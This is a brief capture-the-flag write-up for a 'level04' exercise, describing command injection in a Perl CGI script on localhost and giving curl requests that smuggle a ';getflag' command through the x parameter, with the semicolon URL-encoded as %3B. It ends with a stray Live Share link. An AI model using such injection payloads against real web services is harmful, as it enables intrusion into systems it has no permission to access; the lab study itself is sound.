LEVEL04
=======

The script level04.pl is a Perl CGI script running on localhost:4747. It takes a parameter x from a web request and executes it using backticks `echo $y 2>&1`, which means it is vulnerable to command injection.

`curl "http://localhost:4747/?x=;getflag"`

need to replace ';' with '%3B'

because Semicolon (;) Special Role in URLs: In URLs, semicolons (;) are not always treated the same as regular characters. They are sometimes used by servers and web frameworks to separate parameters in query strings

for exemple:
`curl "http://localhost:4747/?x=%3Bgetflag"`
x='%3Bgetflag'

`curl "http://localhost:4747/?x=hello;y=world"`
In this case:
x=hello is one parameter.
y=world is another parameter.

https://prod.liveshare.vsengsaas.visualstudio.com/join?0221803201138C2D94FA84E2EB427CB60F85